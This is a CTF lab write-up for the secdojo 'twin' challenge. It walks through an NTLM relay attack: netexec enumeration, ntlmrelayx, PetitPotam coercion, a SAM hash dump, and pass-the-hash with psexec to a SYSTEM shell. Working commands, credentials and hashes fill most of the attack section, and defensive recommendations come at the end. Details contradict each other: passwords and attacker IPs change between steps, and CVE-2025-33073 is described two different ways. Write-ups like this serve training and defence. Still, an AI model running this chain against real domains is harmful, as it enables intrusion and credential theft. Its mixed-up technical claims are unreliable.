# AXA/secdojo CTF: twin (exploiting CVE-2025-33073)

## **1. Overview**

This attack leveraged **CVE-2025-33073**, a recently discovered authentication coercion vulnerability in Windows Remote Procedure Call (RPC) protocols, to force a Domain Controller to authenticate to an attacker-controlled host. Combined with NTLM relay to a vulnerable workstation, this resulted in complete compromise of the workstation, credential harvesting, and lateral movement capabilities.

---

## **2. Target Environment**

| **Component** | **IP Address** | **Role** | **Key Characteristics** |
| --- | --- | --- | --- |
| Domain Controller (DC) | `172.16.74.145` | Authentication Server | SMB signing enforced |
| Workstation (WRKSTN) | `172.16.74.215` | Domain-Joined Host | SMB signing disabled (vulnerable) |
| Attacker (Kali) | `16.171.70.202` | Relay & Attack Platform | Running Impacket tools |

**Domain:** `secdojo.local`

**Valid Credentials:** `fernando.lopez:Fernando2020@@eOKMSecd9j0`

---

## **3. Attack Flow**

### **Phase 1: Reconnaissance & Enumeration**

1. **Credential Validation**
    
    Used `netexec` to verify:
    
    - Domain membership and user validity
    - SMB signing status on both DC and workstation
    
    ```bash
    netexec smb 172.16.74.145 -u fernando.lopez -p 'Fernando2020@@eOKMSecd9j0' #DC
    netexec smb 172.16.74.215 -u fernando.lopez -p 'Fernando2020@@eOKMSecd9j0' #WRKSTN
    ```
    
2. **Key Discovery**
    
    ```bash
    netexec smb 172.16.74.145 -u fernando.lopez -p Fernardo2020@@@OKMSecd0j0
    SMB         172.16.74.145   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:secdojo.local) (signing:True) (SMBv1:False)
    SMB         172.16.74.145   445    DC               [+] secdojo.local\fernando.lopez:Fernardo2020@@@OKMSecd0j0
    ```
    
    ```bash
    netexec smb 172.16.74.215 -u fernando.lopez -p Fernardo2020@@@OKMSecd0j0
    SMB         172.16.74.215   445    WRKSTN               [*] Windows Server 2022 Build 20348 x64 (name:WRKSTN) (domain:secdojo.local) (signing:False) (SMBv1:False)
    SMB         172.16.74.215   445    WRKSTN               [+] secdojo.local\fernando.lopez:Fernardo2020@@@OKMSecd0j0
    ```
    
    - DC: SMB signing **enabled** (True)→ prevents direct SMB relay
    - Workstation: SMB signing **disabled** → viable relay target

---

### **Phase 2: NTLM Relay Setup**

1. **Listener Configuration**
    
    Started `ntlmrelayx` to intercept and relay authentication:
    
    ```bash
    impacket-ntlmrelayx -t smb://172.16.74.215 --smb2support
    ```
    
    - Listens on multiple ports (SMB, HTTP, RPC)
    - Targets workstation (`172.16.74.215`)
    - SMB2 support enabled for compatibility
    
    ![image.png](./images/6574a1d8-28b6-404c-be09-f7e38899a950.png)
    

---

### **Phase 3: Authentication Coercion via PetitPotam**

1. **Forcing DC Authentication**
    
    Used PetitPotam to trigger the DC to authenticate to the attacker's relay:
    
    ```bash
    python3 PetitPotam.py -u fernando.lopez -p Fernando2020@@eOKMSecd9j0 \\
      -d secdojo.local 172.16.74.145 172.16.203.145
    ```
    
    ![image.png](./images/image.png)
    
    **Mechanism:**
    
    PetitPotam abuses the **MS-EFSRPC** protocol's `EFsRpcOpenFileRaw` or `EFsRpcEncryptFileSrv` functions to force a machine (DC) to initiate authentication to a specified host (attacker).
    
2. **Coercion Result**
    - DC (`172.16.74.145`) initiated SMB authentication to attacker
    - Authentication captured and relayed to workstation

---

### **Phase 4: Credential Relay & Hash Dump**

1. **Successful Relay**
    
    ```
    [SMB]: Authenticating connection from /@172.16.74.215 against smb://172.16.74.215 SUCCEED
    ```
    

![image.png](./images/image%201.png)

1. **Privilege Escalation**
    
    The relayed session (as `fernando.lopez`) had administrative access to the workstation's `ADMIN$` share.
    
2. **SAM Hash Extraction**
    
    The relay automatically:
    
    - Started the `RemoteRegistry` service
    - Extracted local SAM database
    - Dumped NTLM hashes for all local accounts
    
    **Key Hash:**
    
    `Administrator:500:aad3b435b51404eeaad3b435b51404ee:1abbfce4c00c16cc1ecf3f0fecd8e888:::`
    
    The Administrator's NTLM hash: **`1abbfce4c00c16cc1ecf3f0fecd8e888`**
    

---

### **Phase 5: Lateral Movement via Pass-the-Hash**

1. **Authenticated Access**
    
    Used the captured hash for Pass-the-Hash authentication:
    
    ```bash
    impacket-psexec -hashes :1abbfce4c00c16cc1ecf3f0fecd8e888 Administrator@172.16.74.215
    
    ```
    

![image.png](./images/image%202.png)

1. **Shell Acquisition**
    - Service created (`MXDB`) via SMB
    - Payload executed (`YtBiguay.exe`)
    - System-level command shell obtained

---

### **Phase 6: Flag Extraction**

From the obtained shell:

```bash
C:\\Windows\\system32> type C:\\Users\\Administrator\\Desktop\\proof.txt
twin_workstation_group_36542-rhkqtbbh880krobk7cgq7dqbdzvral9k
```

![image.png](./images/image%203.png)

**Proof Flag:** `twin_workstation_group_36542-rhkqtbbh880krobk7cgq7dqbdzvral9k`

---

## **4. Technical Analysis**

### **Vulnerabilities Exploited**

1. **Missing SMB Signing** (Workstation)
    - Allowed relay of NTLM authentication without detection
    - CVE: 2025‑33073
2. **Authentication Coercion** (PetitPotam - CVE-2021-36942)
    - Forced DC to authenticate to a host
3. **NTLM Authentication Protocol Weaknesses**
    - Relay attacks possible due to lack of channel binding
    - No integrity protection without SMB signing

### **Attack Chain**

```
PetitPotam Coercion → NTLM Capture → SMB Relay →
Local Admin Access → SAM Dump → PTH → Full Compromise
```

---

## **5. Defensive Recommendations**

### **Immediate Actions**

1. **Enable SMB Signing** on all domain-joined hosts
    
    ```
    GPO: Computer Config → Policies → Windows Settings → Security Settings
    → Local Policies → Security Options:
    Microsoft network client: Digitally sign communications (always)
    Microsoft network server: Digitally sign communications (always)
    
    ```
    
2. **Apply Security Updates**
    - Install patches for PetitPotam (CVE-2021-36942)
    - Consider disabling unnecessary RPC endpoints
3. **Implement Network Segmentation**
    - Restrict workstation-to-workstation SMB traffic
    - Limit outbound authentication from DCs

### **Long-Term Mitigations**

1. **Disable NTLM** where possible
    - Transition to Kerberos-only authentication
    - Monitor for NTLM usage
2. **Implement EPA & Channel Binding**
    - Enable Extended Protection for Authentication
    - Configure TLS channel binding for sensitive services
3. **Privilege Management**
    - Remove local admin rights from standard users
    - Implement Just Enough Administration (JEA)
4. **Monitoring & Detection**
    - Alert on `EFsRpcOpenFileRaw` or `EFsRpcEncryptFileSrv` calls
    - Detect SMB authentication from DCs to non-trusted hosts
    - Monitor for SAM database access via RemoteRegistry

---

## **6. Conclusion**

This attack demonstrates how **missing SMB signing** combined with **authentication coercion** can lead to full domain workstation compromise. The attack was successful despite the DC having proper security configurations, highlighting the importance of consistent security policies across all endpoints.

**Key Takeaway:** Domain security is only as strong as its weakest member. Workstations without SMB signing create a pivot point that can be exploited even when core servers are properly hardened.

---

**Attack Duration:** ~45 min from reconnaissance to flag capture

**Tools Used:** Netexec, Impacket (ntlmrelayx, psexec), PetitPotam

**Impact:** Full compromise of workstation, credential exposure, potential lateral movement to other systems